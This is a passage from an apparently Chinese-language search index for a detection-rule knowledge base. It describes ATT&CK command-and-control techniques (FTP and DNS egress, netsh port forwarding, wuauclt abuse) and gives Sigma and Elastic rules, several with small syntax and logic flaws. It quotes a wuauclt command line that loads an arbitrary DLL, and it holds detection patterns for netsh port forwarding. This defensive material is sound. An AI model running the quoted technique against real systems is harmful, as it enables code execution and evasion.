C%E7%BD%91%E8%A1%8C%E4%B8%BA/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>network</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u68c0\u6d4b\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a\ndescription: \u901a\u8fc7NETWORK\u68c0\u6d4b\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a\ntags: T1071.002\nstatus: experimental\nreferences:\n    - https://www.elastic.co/guide/en/siem/guide/current/ftp-file-transfer-protocol-activity-to-the-internet.html#ftp-file-transfer-protocol-activity-to-the-internet\nlogsource:\n    product: network\ndetection:\n    selection1:\n          Type: tcp\n          destination.port: \n                     - 21\n                     - 20\n    selection2:\n          source.ip:\n                     - 10.0.0.0/8\n                     - 172.16.0.0/12\n                     - 192.168.0.0/16\n    selection3:\n          destination.ip:\n                     - 10.0.0.0/8\n                     - 172.16.0.0/12\n                     - 192.168.0.0/16\n    condition: (selection1 and selection2) and not selection3)\nlevel: low\n</code></pre>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#elastic-rule-query","title":"Elastic rule query","text":"<pre><code>network.transport: tcp and destination.port: (20 or 21) and (\nnetwork.direction: outbound or ( source.ip: (10.0.0.0/8 or\n172.16.0.0/12 or 192.168.0.0/16) and not destination.ip: (10.0.0.0/8\nor 172.16.0.0/12 or 192.168.0.0/16) ) )\n</code></pre>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_6","title":"\u5efa\u8bae","text":"<p>\u89c4\u5219\u672a\u7ecf\u7ebf\u4e0a\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528\uff0c\u4f46\u662f\u6211\u76f8\u4fe1\u5b83\u80fd\u591f\u5f88\u597d\u7684\u5e2e\u52a9\u4f60\u53d1\u73b0\u7f51\u5185\u7684\u5a01\u80c1\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1071-002</p> <p>https://attack.mitre.org/techniques/T1071/002/</p> <p>\u68c0\u6d4b\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a</p> <p>https://www.elastic.co/guide/en/siem/guide/current/ftp-file-transfer-protocol-activity-to-the-internet.html#ftp-file-transfer-protocol-activity-to-the-internet</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/","title":"T1071-004-win-\u5185\u4e3b\u673a\u5411\u516c\u7f51DNS\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a","text":""},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u57df\u540d\u7cfb\u7edf\uff08DNS\uff09\u5e94\u7528\u5c42\u534f\u8bae\u8fdb\u884c\u901a\u4fe1\uff0c\u4ee5\u514d\u901a\u8fc7\u4e0e\u73b0\u6709\u6d41\u91cf\u6df7\u5408\u6765\u8fdb\u884c\u68c0\u6d4b/\u7f51\u7edc\u8fc7\u6ee4\u3002\u8fdc\u7a0b\u7cfb\u7edf\u7684\u547d\u4ee4\uff08\u901a\u5e38\u662f\u8fd9\u4e9b\u547d\u4ee4\u7684\u7ed3\u679c\uff09\u5c06\u5d4c\u5165\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u534f\u8bae\u6d41\u91cf\u4e2d\u3002</p> <p>DNS\u534f\u8bae\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u8d77\u7ba1\u7406\u529f\u80fd\uff0c\u56e0\u6b64\u5728\u73af\u5883\u4e2d\u53ef\u80fd\u975e\u5e38\u5e38\u89c1\u3002\u5373\u4f7f\u5728\u5b8c\u6210\u7f51\u7edc\u8eab\u4efd\u9a8c\u8bc1\u4e4b\u524d\uff0c\u4e5f\u53ef\u80fd\u5141\u8bb8DNS\u901a\u4fe1\u3002DNS\u6570\u636e\u5305\u5305\u542b\u8bb8\u591a\u5b57\u6bb5\u548c\u6807\u5934\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u9690\u85cf\u6570\u636e\u3002\u653b\u51fb\u8005\u901a\u5e38\u88ab\u79f0\u4e3aDNS\u96a7\u9053\uff0c\u53ef\u4ee5\u6ee5\u7528DNS\u4e0e\u53d7\u5bb3\u7f51\u7edc\u5185\u53d7\u5176\u63a7\u5236\u7684\u7cfb\u7edf\u8fdb\u884c\u901a\u4fe1\uff0c\u540c\u65f6\u8fd8\u6a21\u4eff\u6b63\u5e38\u7684\u9884\u671f\u6d41\u91cf\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u68c0\u6d4b\u5185\u90e8\u7f51\u7edc\u5ba2\u6237\u7aef\u4f55\u65f6\u5c06DNS\u6d41\u91cf\u76f4\u63a5\u53d1\u9001\u5230\u516c\u7f51\u4e0a\u3002\u5bf9\u4e8e\u6258\u7ba1\u7f51\u7edc\u6765\u8bf4\uff0c\u8fd9\u662f\u975e\u5178\u578b\u7684\u884c\u4e3a\uff0c\u5e76\u4e14\u53ef\u4ee5\u6307\u793a\u6076\u610f\u8f6f\u4ef6\uff0c\u6e17\u900f\uff0c\u547d\u4ee4\u548c\u63a7\u5236\uff0c\u6216\u8005\u7b80\u5355\u5730\u6307\u51fa\u914d\u7f6e\u9519\u8bef\u3002\u6b64DNS\u6d3b\u52a8\u8fd8\u4f1a\u5f71\u54cd\u60a8\u7684\u7ec4\u7ec7\u63d0\u4f9b\u4f01\u4e1a\u76d1\u89c6\u548cDNS\u65e5\u5fd7\u8bb0\u5f55\u7684\u80fd\u529b\uff0c\u5e76\u4f7f\u60a8\u7684\u7f51\u7edc\u5bb9\u6613\u906d\u53d7\u5404\u79cd\u6ee5\u7528\u548c\u6076\u610f\u901a\u4fe1\u3002</p> <p>\u53c2\u8003\u6587\u732e\uff1a</p> <ul> <li>https://www.us-cert.gov/ncas/alerts/TA15-240A</li> <li>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-81-2.pdf</li> </ul>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Network</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u68c0\u6d4b\u5185\u7f51\u4e3b\u673a\u5411\u516c\u7f51dns\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a\ndescription: \u901a\u8fc7\u7f51\u7edc\u6d41\u91cf\u68c0\u6d4b\u5185\u7f51\u4e3b\u673a\u5411\u516c\u7f51dns\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a\ntags: T1071\u3002004\nstatus: experimental\nreferences:\n    - https://www.elastic.co/guide/en/siem/guide/current/dns-activity-to-the-internet.html\nlogsource:\n    product: network\ndetection:\n    selection1:\n          destination.port: 53\n    selection2:\n          source.ip:\n                - 10.0.0.0/8\n                - 172.16.0.0/12\n                - 192.168.0.0/16\n    slection3:\n          destination.ip: \n                - 10.0.0.0/8\n                - 127.0.0.0/8\n                - 169.254.169.254/32\n                - 172.16.0.0/12\n                - 192.168.0.0/16\n                - 224.0.0.251\n                - 224.0.0.252\n                - ::1\n                - 255.255.255.255\n                - ff02::fb\n    condition: selection1 and not selection2\nlevel: medium\n</code></pre>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#elastic-rule-query","title":"Elastic rule query","text":"<pre><code>destination.port:53 and source.ip:(10.0.0.0/8 or 172.16.0.0/12 or\n192.168.0.0/16) and not destination.ip:(10.0.0.0/8 or 127.0.0.0/8 or\n169.254.169.254/32 or 172.16.0.0/12 or 192.168.0.0/16 or 224.0.0.251\nor 224.0.0.252 or 255.255.255.255 or \"::1\" or \"ff02::fb\")\n</code></pre>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_6","title":"\u5efa\u8bae","text":"<p>\u4ece\u8fd9\u6761\u89c4\u5219\u4e2d\u6392\u9664DNS\u670d\u52a1\u5668\uff0c\u56e0\u4e3a\u8fd9\u662f\u9884\u671f\u7684\u884c\u4e3a\u3002\u7aef\u70b9\u901a\u5e38\u67e5\u8be2\u5728\u5176DHCP\u4f5c\u7528\u57df\u4e2d\u5b9a\u4e49\u7684\u672c\u5730DNS\u670d\u52a1\u5668\uff0c\u4f46\u662f\u5982\u679c\u7528\u6237\u5c06\u5176\u7aef\u70b9\u914d\u7f6e\u4e3a\u4f7f\u7528\u8fdc\u7a0bDNS\u670d\u52a1\u5668\uff0c\u5219\u53ef\u4ee5\u8986\u76d6\u8be5\u7aef\u70b9\u3002\u8fd9\u5728\u53d7\u7ba1\u4f01\u4e1a\u7f51\u7edc\u4e2d\u5e76\u4e0d\u5e38\u89c1\uff0c\u56e0\u4e3a\u4f7f\u7528\u6c34\u5e73\u5206\u5272DNS\u53ef\u80fd\u4f1a\u7834\u574fIntranet\u540d\u79f0\u89e3\u6790\u3002\u67d0\u4e9b\u6d88\u8d39\u8005VPN\u670d\u52a1\u548c\u6d4f\u89c8\u5668\u63d2\u4ef6\u53ef\u80fd\u4f1a\u5c06DNS\u6d41\u91cf\u53d1\u9001\u5230\u8fdc\u7a0bInternet\u76ee\u7684\u5730\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f53\u8fd9\u662f\u9884\u671f\u7684\u884c\u4e3a\u65f6\uff0c\u53ef\u4ee5\u4ece\u6b64\u89c4\u5219\u4e2d\u6392\u9664\u6b64\u7c7b\u8bbe\u5907\u6216\u7f51\u7edc\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1071.004</p> <p>https://attack.mitre.org/techniques/T1071/004/</p> <p>\u68c0\u6d4b\u5185\u7f51\u4e3b\u673a\u5411\u516c\u7f51dns\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a</p> <p>https://www.elastic.co/guide/en/siem/guide/current/dns-activity-to-the-internet.html</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/","title":"T1090-001-win-\u94fe\u63a5\u4ee3\u7406","text":""},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fde\u63a5\u4ee3\u7406\u5728\u7cfb\u7edf\u4e4b\u95f4\u5b9a\u5411\u7f51\u7edc\u6d41\u91cf\uff0c\u6216\u8005\u5145\u5f53\u4e0e\u547d\u4ee4\u548c\u63a7\u5236\u670d\u52a1\u5668\u8fdb\u884c\u7f51\u7edc\u901a\u4fe1\u7684\u4e2d\u4ecb\uff0c\u4ee5\u907f\u514d\u76f4\u63a5\u8fde\u63a5\u81f3\u5176\u57fa\u7840\u7ed3\u6784\u3002\u5b58\u5728\u8bb8\u591a\u542f\u7528\u4ee3\u7406\u6216\u7aef\u53e3\u91cd\u5b9a\u5411\u7684\u6d41\u91cf\u91cd\u5b9a\u5411\u7684\u5de5\u5177\uff0c\u5305\u62ecHTRAN\uff0cZXProxy\u548cZXPortMap\u3002\u653b\u51fb\u8005\u4f7f\u7528\u8fd9\u4e9b\u7c7b\u578b\u7684\u4ee3\u7406\u6765\u7ba1\u7406\u547d\u4ee4\u548c\u63a7\u5236\u901a\u4fe1\uff0c\u51cf\u5c11\u540c\u65f6\u51fa\u7ad9\u7f51\u7edc\u8fde\u63a5\u7684\u6570\u91cf\uff0c\u9762\u5bf9\u8fde\u63a5\u4e22\u5931\u65f6\u63d0\u4f9b\u5f39\u6027\u6216\u5728\u53d7\u5bb3\u8005\u4e4b\u95f4\u8d8a\u8fc7\u73b0\u6709\u7684\u53d7\u4fe1\u4efb\u901a\u4fe1\u8def\u5f84\u4ee5\u907f\u514d\u6000\u7591\u3002</p> <p>\u5916\u90e8\u8fde\u63a5\u4ee3\u7406\u7528\u4e8e\u63a9\u76d6C2\u6d41\u91cf\u7684\u76ee\u7684\u5730\uff0c\u901a\u5e38\u4f7f\u7528\u7aef\u53e3\u91cd\u5b9a\u5411\u5668\u5b9e\u73b0\u3002\u53d7\u5bb3\u73af\u5883\u4e4b\u5916\u7684\u53d7\u635f\u7cfb\u7edf\u4ee5\u53ca\u5df2\u8d2d\u4e70\u7684\u57fa\u7840\u7ed3\u6784\uff08\u5982\u57fa\u4e8e\u4e91\u7684\u8d44\u6e90\u6216\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff09\u90fd\u53ef\u4ee5\u7528\u4e8e\u8fd9\u4e9b\u76ee\u7684\u3002\u53ef\u4ee5\u57fa\u4e8e\u5bf9\u4ece\u53d7\u611f\u67d3\u7cfb\u7edf\u5230\u4ee3\u7406\u7684\u8fde\u63a5\u8fdb\u884c\u8c03\u67e5\u7684\u53ef\u80fd\u6027\u5f88\u5c0f\u7684\u53ef\u80fd\u6027\u6765\u9009\u62e9\u4ee3\u7406\u3002\u53d7\u5bb3\u8005\u7cfb\u7edf\u5c06\u76f4\u63a5\u4e0eInternet\u4e0a\u7684\u5916\u90e8\u4ee3\u7406\u8fdb\u884c\u901a\u4fe1\uff0c\u7136\u540e\u8be5\u4ee3\u7406\u4f1a\u5c06\u901a\u4fe1\u8f6c\u53d1\u5230C2\u670d\u52a1\u5668\u3002</p> <p>\u5185\u90e8\u8fde\u63a5\u4ee3\u7406\u53ef\u7528\u4e8e\u5408\u5e76\u6765\u81ea\u53d7\u611f\u67d3\u7cfb\u7edf\u7684\u5185\u90e8\u8fde\u63a5\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f7f\u7528\u53d7\u635f\u7684\u5185\u90e8\u7cfb\u7edf\u4f5c\u4e3a\u4ee3\u7406\uff0c\u4ee5\u9690\u85cfC2\u6d41\u91cf\u7684\u771f\u5b9e\u76ee\u7684\u5730\u3002\u4ee3\u7406\u53ef\u4ee5\u5c06\u6d41\u91cf\u4ece\u7f51\u7edc\u5185\u90e8\u7684\u53d7\u611f\u67d3\u7cfb\u7edf\u91cd\u5b9a\u5411\u5230\u5916\u90e8C2\u670d\u52a1\u5668\uff0c\u4ece\u800c\u96be\u4ee5\u53d1\u73b0\u6076\u610f\u6d41\u91cf\u3002\u53e6\u5916\uff0c\u8be5\u7f51\u7edc\u53ef\u7528\u4e8e\u5c06\u4fe1\u606f\u4ece\u4e00\u4e2a\u7cfb\u7edf\u4e2d\u7ee7\u5230\u53e6\u4e00\u4e2a\u7cfb\u7edf\uff0c\u4ee5\u907f\u514d\u5c06\u6d41\u91cf\u5e7f\u64ad\u5230\u6240\u6709\u7cfb\u7edf\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u672c\u6848\u4f8b\u4e3b\u8981\u6a21\u62dfwindows\u5229\u7528netsh\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u4e8b\u4ef6ID\uff0c\u8fdb\u7a0b\uff0c\u547d\u4ee4\u884c\u53c2\u6570\u7b49\u4fe1\u606f\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: netsh\u7aef\u53e3\u8f6c\u53d1\ndescription: windows server 2016\ntags: T1090-001\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\netsh.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: \"netsh interface portproxy add v4tov4 *\"  #\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_6","title":"\u5efa\u8bae","text":"<p>\u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u65e0\u6cd5\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u53ca\u5b50\u7236\u8fdb\u7a0b\uff0c\u5efa\u8bae\u901a\u8fc7sysmon\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1090-001-win-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1090-001</p> <p>https://attack.mitre.org/techniques/T1090/001</p> <p>\u5982\u4f55\u5728Windows\u4e2d\u4f7f\u7528netsh\u547d\u4ee4\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1</p> <p>https://www.freebuf.com/articles/system/176889.html</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/","title":"T1105-Windows Update\u88ab\u53d1\u73b0\u53ef\u6ee5\u7528\u4e8e\u6267\u884c\u6076\u610f\u7a0b\u5e8f\u884c\u4e3a\u68c0\u6d4b","text":""},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5de5\u5177\u6216\u5176\u4ed6\u6587\u4ef6\u4ece\u5916\u90e8\u7cfb\u7edf\u8f6c\u79fb\u5230\u88ab\u653b\u9677\u7684\u73af\u5883\u4e2d\u3002\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u548c\u63a7\u5236\u901a\u9053\u4ece\u5916\u90e8\u653b\u51fb\u8005\u63a7\u5236\u7684\u7cfb\u7edf\u4e2d\u590d\u5236\u6587\u4ef6\uff0c\u4ee5\u4fbf\u5c06\u5de5\u5177\u5e26\u5165\u88ab\u653b\u9677\u7684\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u6216\u901a\u8fc7\u4e0e\u53e6\u4e00\u4e2a\u5de5\u5177\uff08\u5982FTP\uff09\u7684\u66ff\u4ee3\u534f\u8bae\u590d\u5236\u6587\u4ef6\u3002\u6587\u4ef6\u4e5f\u53ef\u4ee5\u5728Mac\u548cLinux\u4e0a\u4f7f\u7528scp\u3001rsync\u548csftp\u7b49\u672c\u673a\u5de5\u5177\u8fdb\u884c\u590d\u5236\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u63f4\u5f15\u5916\u5a92Bleeping Computer\u62a5\u9053\uff0cMDSec\u7814\u7a76\u4eba\u5458David Middlehurst\u53d1\u73b0\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u884c\u9009\u9879\u4ece\u4efb\u610f\u7279\u5236\u7684DLL\u52a0\u8f7dwuauclt\uff0c\u4ece\u800c\u5728Windows 10\u7cfb\u7edf\u4e0a\u6267\u884c\u6076\u610f\u4ee3\u7801\uff1a</p> <pre><code>wuauclt.exe /UpdateDeploymentProvider [path_to_dll] /RunHandlerComServer\n</code></pre> <p>\u8be5\u6280\u5de7\u7ed5\u8fc7Windows\u7528\u6237\u5e10\u6237\u63a7\u5236\uff08UAC\uff09\u6216Windows 